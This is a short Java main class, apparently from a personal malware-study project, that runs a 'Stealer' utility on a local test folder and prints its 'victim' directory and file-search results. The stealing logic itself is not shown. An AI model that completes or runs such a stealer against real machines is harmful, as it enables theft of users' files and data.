import Utils.Stealer;

public class RunStealer {
    public static void main(String[] args) {
        Stealer stealer = new Stealer();
        System.out.println("Runninngg");
        String datadir = stealer.searchDirectoryFiles();
        System.out.println(stealer.getVictimDir());
        System.out.println("std"+datadir);

        System.out.println("info from dir");
        stealer.analizePaths("C:\\Users\\sebic\\OneDrive\\Documentos\\ProjectVirusStudys\\tests\\Disco");
    }
}
